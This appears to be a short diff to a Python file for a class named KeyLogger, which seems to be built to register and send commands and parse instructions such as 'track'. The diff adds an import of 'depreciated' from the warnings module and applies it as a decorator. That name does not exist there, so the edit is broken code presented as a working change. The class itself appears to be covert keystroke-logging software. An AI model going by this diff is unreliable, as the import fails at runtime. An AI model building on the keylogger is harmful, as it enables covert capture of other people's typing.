@@ -5,6 +5,7 @@ try:
 except ImportError:
     keyboard = False
 import logging  # noqa: E402
+from warnings import depreciated
 
 class KeyLogger:
     def __init__(self, register_cmd_function, send_cmd_function, cmdClass:CommandHandler):
@@ -74,7 +75,8 @@ class KeyLogger:
         self.logger.info("Shutting down KeyLogger")
         self.listener.stop()
         # Right here add the methods to stop the rest of the code
-        
+
+    @depreciated
     def decode_command(self, string):
         string = string.split(" ")
         if string[0] == "track":
